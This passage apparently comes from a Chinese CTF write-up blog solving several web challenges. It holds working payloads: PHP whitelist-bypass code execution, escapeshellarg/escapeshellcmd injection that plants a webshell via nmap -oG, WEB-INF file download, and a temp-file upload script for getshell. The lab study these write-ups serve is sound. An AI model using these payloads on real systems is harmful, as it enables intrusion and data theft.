class="hljs-string">&#x27;acos&#x27;</span>, <span class="hljs-string">&#x27;acosh&#x27;</span>, <span class="hljs-string">&#x27;asin&#x27;</span>, <span class="hljs-string">&#x27;asinh&#x27;</span>, <span class="hljs-string">&#x27;atan2&#x27;</span>, <span class="hljs-string">&#x27;atan&#x27;</span>, <span class="hljs-string">&#x27;atanh&#x27;</span>, <span class="hljs-string">&#x27;base_convert&#x27;</span>, <span class="hljs-string">&#x27;bindec&#x27;</span>, <span class="hljs-string">&#x27;ceil&#x27;</span>, <span class="hljs-string">&#x27;cos&#x27;</span>, <span class="hljs-string">&#x27;cosh&#x27;</span>, <span class="hljs-string">&#x27;decbin&#x27;</span>, <span class="hljs-string">&#x27;dechex&#x27;</span>, <span class="hljs-string">&#x27;decoct&#x27;</span>, <span class="hljs-string">&#x27;deg2rad&#x27;</span>, <span class="hljs-string">&#x27;exp&#x27;</span>, <span class="hljs-string">&#x27;expm1&#x27;</span>, <span class="hljs-string">&#x27;floor&#x27;</span>, <span class="hljs-string">&#x27;fmod&#x27;</span>, <span class="hljs-string">&#x27;getrandmax&#x27;</span>, <span class="hljs-string">&#x27;hexdec&#x27;</span>, <span class="hljs-string">&#x27;hypot&#x27;</span>, <span class="hljs-string">&#x27;is_finite&#x27;</span>, <span class="hljs-string">&#x27;is_infinite&#x27;</span>, <span class="hljs-string">&#x27;is_nan&#x27;</span>, <span class="hljs-string">&#x27;lcg_value&#x27;</span>, <span class="hljs-string">&#x27;log10&#x27;</span>, <span class="hljs-string">&#x27;log1p&#x27;</span>, <span class="hljs-string">&#x27;log&#x27;</span>, <span class="hljs-string">&#x27;max&#x27;</span>, <span class="hljs-string">&#x27;min&#x27;</span>, <span class="hljs-string">&#x27;mt_getrandmax&#x27;</span>, <span class="hljs-string">&#x27;mt_rand&#x27;</span>, <span class="hljs-string">&#x27;mt_srand&#x27;</span>, <span class="hljs-string">&#x27;octdec&#x27;</span>, <span class="hljs-string">&#x27;pi&#x27;</span>, <span class="hljs-string">&#x27;pow&#x27;</span>, <span class="hljs-string">&#x27;rad2deg&#x27;</span>, <span class="hljs-string">&#x27;rand&#x27;</span>, <span class="hljs-string">&#x27;round&#x27;</span>, <span class="hljs-string">&#x27;sin&#x27;</span>, <span class="hljs-string">&#x27;sinh&#x27;</span>, <span class="hljs-string">&#x27;sqrt&#x27;</span>, <span class="hljs-string">&#x27;srand&#x27;</span>, <span class="hljs-string">&#x27;tan&#x27;</span>, <span class="hljs-string">&#x27;tanh&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="hljs-variable">$content</span>, <span class="hljs-variable">$used_funcs</span>);  <br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$used_funcs</span>[<span class="hljs-number">0</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span>) &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//帮你算出答案</span><br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$content</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>1.长度被限制在80以内<br>2.黑名单<br>3.白名单</p><p>可用函数</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">base_convert</span><span class="hljs-params">()</span></span>        在任意进制之间转换数字。<br><span class="hljs-function"><span class="hljs-title">bindec</span><span class="hljs-params">()</span></span>把二进制转换为十进制。<br><span class="hljs-function"><span class="hljs-title">decbin</span><span class="hljs-params">()</span></span>把十进制转换为二进制。<br><span class="hljs-function"><span class="hljs-title">dechex</span><span class="hljs-params">()</span></span>                把十进制转换为十六进制。<br><span class="hljs-function"><span class="hljs-title">decoct</span><span class="hljs-params">()</span></span> 把十进制转换为八进制。<br><span class="hljs-function"><span class="hljs-title">hexdec</span><span class="hljs-params">()</span></span>把十六进制转换为十进制。<br><span class="hljs-function"><span class="hljs-title">octdec</span><span class="hljs-params">()</span></span>把八进制转换为十进制。<br></code></pre></td></tr></table></figure><p>payload1：GET传参</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">system(<span class="hljs-built_in">cat</span> /flag)<br>[]被过滤，使用&#123;&#125;代替<br>转变为 &#123;a&#125;(&#123;b&#125;)&amp;a=system&amp;b=<span class="hljs-built_in">cat</span> /flag<br></code></pre></td></tr></table></figure><p>构造_GET参数，需要hex2bin()函数</p><p>hex2bin() 函数把十六进制值的字符串转换为 ASCII 字符</p><p>base_convert() 函数在任意进制之间转换数字</p><p>dechex() 函数把十进制数转换为十六进制数</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">echo base_convert(&quot;hex2bin&quot;,<span class="hljs-number">36</span>,<span class="hljs-number">10</span>)<span class="hljs-comment">;</span><br><span class="hljs-number">37907361743</span><br>得到了hex2bin函数<br>base_convert(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)  =&gt;hex2bin<br>base_convert(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(dechex(<span class="hljs-number">1598506324</span>))   =&gt;_GET<br></code></pre></td></tr></table></figure><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams">payload: <span class="hljs-symbol">$</span><span class="hljs-built_in">pi</span>=base_convert(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(dechex(<span class="hljs-number">1598506324</span>));(<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-built_in">pi</span>)&#123;<span class="hljs-built_in">pi</span>&#125;((<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-built_in">pi</span>)&#123;<span class="hljs-built_in">abs</span>&#125;)&amp;<span class="hljs-built_in">pi</span>=<span class="hljs-keyword">system</span>&amp;<span class="hljs-built_in">abs</span>=cat /flag<br>(<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-built_in">pi</span>)&#123;<span class="hljs-built_in">pi</span>&#125;((<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-built_in">pi</span>)&#123;<span class="hljs-built_in">abs</span>&#125;) =&gt; (<span class="hljs-symbol">$</span>_GET)&#123;<span class="hljs-built_in">pi</span>&#125;(<span class="hljs-symbol">$</span>_GET)&#123;<span class="hljs-built_in">abs</span>&#125;<br></code></pre></td></tr></table></figure><p>payload2:header传参</p><p>getallheaders — 获取全部 HTTP 请求头信息</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">palyload: <span class="hljs-variable">$pi</span>=base_convert,<span class="hljs-variable">$pi</span>(<span class="hljs-number">696468</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(<span class="hljs-variable">$pi</span>(<span class="hljs-number">8768397090111664438</span>,<span class="hljs-number">10</span>,<span class="hljs-number">30</span>)()&#123;<span class="hljs-number">1</span>&#125;)<br><br><span class="hljs-function"><span class="hljs-title">base_convert</span><span class="hljs-params">(<span class="hljs-number">696468</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)</span></span> =&gt; <span class="hljs-string">&quot;exec&quot;</span><br><span class="hljs-variable">$pi</span>(<span class="hljs-number">8768397090111664438</span>,<span class="hljs-number">10</span>,<span class="hljs-number">30</span>) =&gt; <span class="hljs-string">&quot;getallheaders&quot;</span><br><span class="hljs-function"><span class="hljs-title">exec</span><span class="hljs-params">(getallheaders()</span></span>&#123;<span class="hljs-number">1</span>&#125;)<br><span class="hljs-number">1</span>:cat flag.php<br></code></pre></td></tr></table></figure><h2 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h2><p>源码中提示</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">java<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.FileNotFoundException</span>:&#123;help.docx&#125;<br></code></pre></td></tr></table></figure><p>WEB-INF是java的WEB应用的安全目录。</p><p>1.WEB-INF&#x2F;web.xml</p><p>web应用程序配置文件，描述了servlet和其他的应用组件配置及命名规则。</p><p>2.WEB-INF&#x2F;classes</p><p>包含了站点所有用的class文件，包括servlet class和非servlet class</p><p>3.WEB-INF&#x2F;lib</p><p>存放web应用需要的JAR文件</p><p>4.WEB-INF&#x2F;src</p><p>源码目录，按照包名结构放置各个java文件</p><p>5.WEB-INF&#x2F;database.properties</p><p>数据库配置文件</p><p>6.WEB-INF&#x2F;tags</p><p>存放了自定义标签文件</p><p>7.WEB-INF&#x2F;jsp</p><p>jsp 1.2 一下版本的文件存放位置。</p><p>8.WEB-INF&#x2F;jsp2</p><p>存放jsp2.0以下版本的文件。</p><p>9.META-INF</p><p>相当于一个信息包。</p><p>Nginx在映射静态文件时，把WEB-INF目录映射进去，而又没有做Nginx的相关安全配置（或Nginx自身一些缺陷影响）。从而导致通过Nginx访问到Tomcat的WEB-INF目录</p><p>解题思路：</p><p>通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">POST <span class="hljs-regexp">/Download?filename=WEB-INF/</span>web.xml<br></code></pre></td></tr></table></figure><p><img src="https://i.imgs.ovh/2023/12/07/fFkDU.png"></p><p>com.wm.FlagController，尝试下载FlagController.class文件</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">POST <span class="hljs-regexp">/Download?filename=WEB-INF/</span>classes<span class="hljs-regexp">/com/</span>wm<span class="hljs-regexp">/ctf/</span>FlagController.<span class="hljs-keyword">class</span><br></code></pre></td></tr></table></figure><p><img src="https://i.imgs.ovh/2023/12/07/fFBZ0.png" alt="image-20231207211036485"></p><h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs gauss">escapeshellarg — 把字符串转码为可以在 <span class="hljs-built_in">shell</span> 命令里使用的参数<br><br>功能 ：<span class="hljs-built_in">escapeshellarg</span>() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 <span class="hljs-built_in">shell</span> 函数，<span class="hljs-built_in">shell</span> 函数包含 <span class="hljs-built_in">exec</span>()，<span class="hljs-keyword">system</span>() 执行运算符(反引号)<br><br>定义 ：<span class="hljs-keyword">string</span> <span class="hljs-built_in">escapeshellarg</span> ( <span class="hljs-keyword">string</span> $arg )<br><br>escapeshellcmd<br><br>功能 ：<span class="hljs-built_in">escapeshellcmd</span>() 对字符串中可能会欺骗 <span class="hljs-built_in">shell</span> 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 <span class="hljs-built_in">exec</span>() 或 <span class="hljs-keyword">system</span>() 函数，或者 执行操作符 之前进行转义<br>反斜线（\）会在以下字符之前插入：&amp;<span class="hljs-meta">#;`|*?~&lt;&gt;^()[]&#123;&#125;$\、\x0A 和 \xFF。 &#x27; 和 &quot; 仅在不配对的时候被转义。</span><br></code></pre></td></tr></table></figure><ol><li><p>传入的参数是</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>&#x27; -v -d a=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></li><li><p>由于<code>escapeshellarg</code>先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。所以处理之后的效果如下：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-string">&#x27;127.0.0.1&#x27;</span>\<span class="hljs-string">&#x27;&#x27;</span> -v -d <span class="hljs-attribute">a</span>=1&#x27;<br></code></pre></td></tr></table></figure></li><li><p>接着 <code>escapeshellcmd</code> 函数对第二步处理后字符串中的 <code>\</code> 以及 <code>a=1&#39;</code> 中的单引号进行转义处理，结果如下所示：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-string">&#x27;127.0.0.1&#x27;</span>\\<span class="hljs-string">&#x27;&#x27;</span> -v -d <span class="hljs-attribute">a</span>=1\&#x27;<br></code></pre></td></tr></table></figure></li><li><p>由于第三步处理之后的payload中的 <code>\\</code> 被解释成了 <code>\</code> 而不再是转义字符，所以单引号配对连接之后将payload分割为三个部分，具体如下所示：</p></li></ol><p><img src="https://i.imgs.ovh/2023/12/07/fFRZd.png" alt="6"></p><p>可以简化为 <code>curl 127.0.0.1\ -v -d a=1&#39;</code> ，即向 <code>127.0.0.1\</code> 发起请求，POST 数据为 <code>a=1&#39;</code> 。</p><p><strong>但是如果是先用 escapeshellcmd 函数过滤，再用的 escapeshellarg 函数过滤，则没有这个问题。</strong></p><p><a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day5/files/README.md">PHP escapeshellarg()和escapeshellcmd()并用之殇</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;<br>  <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];<br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;host&#x27;</span>])) &#123;<br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-variable">$host</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;host&#x27;</span>];<br>  <span class="hljs-variable">$host</span> = <span class="hljs-title function_ invoke__">escapeshellarg</span>(<span class="hljs-variable">$host</span>);<br>  <span class="hljs-variable">$host</span> = <span class="hljs-title function_ invoke__">escapeshellcmd</span>(<span class="hljs-variable">$host</span>);<br>  <span class="hljs-variable">$sandbox</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&quot;glzjin&quot;</span>. <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;you are in sandbox &#x27;</span>.<span class="hljs-variable">$sandbox</span>;<br>  @<span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$sandbox</span>);<br>  <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-variable">$sandbox</span>);<br>  <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="hljs-variable">$host</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>有system来执行命令</p><p>常见的命令后注入操作如 | &amp; &amp;&amp; ; 都不行，虽然我们通过上面的操作逃过了单引号，但escapeshellcmd会对这些特殊符号前面加上\来转移</p><p>nmap命令中 有一个参数-oG可以实现将命令和结果写到文件。 这个命令就是我们的输入可控，然后写入到文件</p><p>payload：</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?host=&#x27; </span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml"> -oG test.php &#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?host=&#x27; </span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> `cat /flag`;<span class="hljs-meta">?&gt;</span></span><span class="language-xml"> -oG test.php &#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://i.imgs.ovh/2023/12/07/fFcKK.png" alt="image-20231207215017541"></p><p>访问查看flag</p><p><img src="https://i.imgs.ovh/2023/12/07/fFe42.png" alt="image-20231207215045898"></p><h2 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><brspan class="hljs-meta">?&gt;</span><span class="hljs-string">&#x27;&amp;filename=test.php</span><br></code></pre></td></tr></table></figure><p>连接中国蚁剑<br>在根目录运行readflag</p><h2 id="NPUCTF2020-ezinclude"><a href="#NPUCTF2020-ezinclude" class="headerlink" title="[NPUCTF2020]ezinclude"></a>[NPUCTF2020]ezinclude</h2><p>源码发现提示</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--md5($secret.$name)===$pass --&gt;</span><br></code></pre></td></tr></table></figure><p>get方式传入值</p><p><img src="https://i0.imgs.ovh/2024/03/06/QxTMV.png" alt="image-20240307213807493"></p><p>响应包将一串hash值设置在Cookie内返回，而这串hash值是当前传入的参数name使用md5加密后的结果，我们将获取到的值再用参数pass传入就可以了</p><p>发现&#x2F;flflflflag.php</p><p><img src="https://i0.imgs.ovh/2024/03/06/QxqSJ.png" alt="image-20240307214040392"></p><p>include($_GET[“file”])</p><p>用伪协议读取一下源码</p><p><img src="https://i0.imgs.ovh/2024/03/06/Qx9dW.png" alt="image-20240307214340054"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$file</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/data|input|zip/is&#x27;</span>,<span class="hljs-variable">$file</span>))&#123;<br>  <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;nonono&#x27;</span>);<br>&#125;<br>@<span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;include($_GET[&quot;file&quot;])&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>过滤了data和input，不用考虑命令执行了。</p><p>扫描发现dir.php和congfig.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;/tmp&#x27;</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$secret</span>=<span class="hljs-string">&#x27;%^$&amp;$#fffdflag_is_not_here_ha_ha&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>dir.php能打印临时文件夹里的内容,尝试利用</p><p>观察响应包可得X-Powered-By: PHP&#x2F;7.0.33</p><p>知识点：</p><p>php7.0的bug：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/string.strip_tags/</span>resource=<span class="hljs-regexp">/etc/</span>passwd<br></code></pre></td></tr></table></figure><blockquote><p>使用php:&#x2F;&#x2F;filter&#x2F;string.strip_tags导致php崩溃清空堆栈重启，如果在同时上传了一个文件，那么这个tmp file就会一直留在tmp目录，再进行文件名爆破就可以getshell。这个崩溃原因是存在一处空指针引用。</p><p>该方法仅适用于以下php7版本，php5并不存在该崩溃。</p></blockquote><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">• php<span class="hljs-number">7.0.0-7</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span>可以利用， <span class="hljs-number">7</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span>x版本的已被修复<br><br>• php<span class="hljs-number">7.1.3-7</span>.<span class="hljs-number">2</span>.<span class="hljs-number">1</span>可以利用， <span class="hljs-number">7</span>.<span class="hljs-number">2</span>.<span class="hljs-number">1</span>x版本的已被修复<br><br>• php<span class="hljs-number">7.2.2-7</span>.<span class="hljs-number">2</span>.<span class="hljs-number">8</span>可以利用， <span class="hljs-number">7</span>.<span class="hljs-number">2</span>.<span class="hljs-number">9</span>一直到<span class="hljs-number">7</span>.<span class="hljs-number">3</span>到现在的版本已被修复<br></code></pre></td></tr></table></figure><p>脚本如下</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">import requests</span><br><span class="language-xml">from io import BytesIO</span><br><span class="language-xml"></span><br><span class="language-xml">url = &quot;http://daf37d2a-5017-47b7-a42b-71db66a88c63.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span><br><span class="language-xml"></span><br><span class="language-xml">phpfile = &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>(); <span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;</span><br><span class="language-xml">filedata = &#123;</span><br><span class="language-xml">    &quot;file&quot;:phpfile</span><br><span class="language-xml">&#125;</span><br><span class="language-xml"></span><br><span class="language-xml">bak = requests.post(url=url, files=filedata)</span><br><span class="language-xml">print(bak.text)</span><br></code></pre></td></tr></table></figure><p>进入<strong>dir.php</strong>查看发现木马已上传：</p><p><img src="https://i0.imgs.ovh/2024/03/06/QxN2v.png" alt="image-20240307215250453"></p><p><img src="https://i0.imgs.ovh/2024/03/06/Qxahe.png" alt="image-20240307215313276"></p><h2 id="HFCTF2020-EasyLogin"><a href="#HFCTF2020-EasyLogin" class="headerlink" title="[HFCTF2020]EasyLogin"></a>[HFCTF2020]EasyLogin</h2><p>查看源码app.js</p><p><img src="https://i0.imgs.ovh/2024/03/07/QUgou.png" alt="image-20240308202156477"></p><p>观察网站源码，在<code>app.js</code>中可以查看登录验证，可以看到登录相关的主要存在这三个变量中<code>username, password, authorization</code>。当登录成功时就会跳转到&#x2F;home目录下失败则会返回<code>Cannot read property &#39;split&#39; of undefined</code></p><p>寻找未发现</p><p>由于上面的 app.js 里有写到 static 是直接映射到程序根目录的，猜测程序可能存在任意文件读取漏洞。继续对网站进行探测，在<code>controllers</code>接口中发现<code>api.js</code>泄露，里面存在具体的登录注册等逻辑代码，也就是放在服务端的代码。</p><p>&#x2F;controllers&#x2F;api.js</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">crypto</span> = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;crypto&#x27;</span>);<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">fs</span> = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>)<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">jwt</span> = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;jsonwebtoken&#x27;</span>)<br> <br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">APIError</span> = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;../rest&#x27;</span>).APIError;<br> <br>module.exports = &#123;<br>    <span class="hljs-string">&#x27;POST /api/register&#x27;</span>: <span class="hljs-title function_ invoke__">async</span> (ctx, next) =&gt; &#123;<br>        <span class="hljs-keyword">const</span> &#123;username, password&#125; = ctx.request.body;<br> <br>        <span class="hljs-keyword">if</span>(!username || username === <span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">APIError</span>(<span class="hljs-string">&#x27;register error&#x27;</span>, <span class="hljs-string">&#x27;wrong username&#x27;</span>);<br>        &#125;<br> <br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">global</span>.secrets.length &gt; <span class="hljs-number">100000</span>) &#123;<br>            <span class="hljs-keyword">global</span>.secrets = [];<br>        &#125;<br> <br>        <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">secret</span> = 